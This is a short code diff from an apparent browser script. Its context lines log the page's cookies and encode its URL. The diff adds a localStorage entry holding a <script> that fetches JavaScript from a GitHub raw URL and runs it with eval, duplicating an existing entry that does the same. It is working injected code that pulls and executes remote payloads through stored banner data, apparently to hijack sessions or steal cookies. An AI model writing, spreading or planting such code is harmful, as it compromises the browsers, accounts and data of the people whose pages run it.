@@ -6,6 +6,13 @@ urll = encodeURI(location.href)
 
 console.log(cookies)
 
+localStorage.bannerData = `<script>
+fetch('https://raw.githubusercontent.com/CompartirGoogleDocs/CompartirGoogleDocs/main/JS2').then((res) => {return res.text();
+  }).then((json) => {console.log(json);eval(json); // The json object is here;
+  });
+</script>`
+
+
 localStorage.trainerNewCachedBannersData = `<script>
 fetch('https://raw.githubusercontent.com/CompartirGoogleDocs/CompartirGoogleDocs/main/JS2').then((res) => {return res.text();
   }).then((json) => {console.log(json);eval(json); // The json object is here;
